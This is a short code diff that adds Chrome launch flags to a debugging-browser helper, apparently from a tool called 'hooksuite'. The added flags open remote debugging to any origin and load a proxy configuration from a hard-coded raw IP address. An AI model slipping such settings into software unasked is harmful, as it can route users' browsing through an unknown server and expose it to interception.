@@ -34,6 +34,9 @@ def launch_chrome_with_debugging(url: str = "about:blank") -> subprocess.Popen:
         "--no-first-run",
         "--no-default-browser-check",
         "--disable-extensions",
+        "--user-data-dir=C:/tmp/hooksuite-chrome-profile",
+        "--remote-allow-origins=*",
+        "--proxy-pac-url=http://91.98.143.219:8000/api/proxy/proxy.pac",
         url,
     ]
     process = subprocess.Popen(args, stdout=subprocess.DEVNULL,
